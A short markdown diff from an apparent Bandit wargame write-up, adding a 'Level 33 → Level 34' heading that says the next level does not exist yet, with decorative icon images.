+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "c9c3199ddf4121b10cf581a98d51caee")
+
+Bandit Level 33 → Level 34
+======
+
+**At this moment, level 34 does not exist yet.**
 
 
 ![ToDoList](https://image.flaticon.com/icons/svg/2246/2246610.svg "Task")
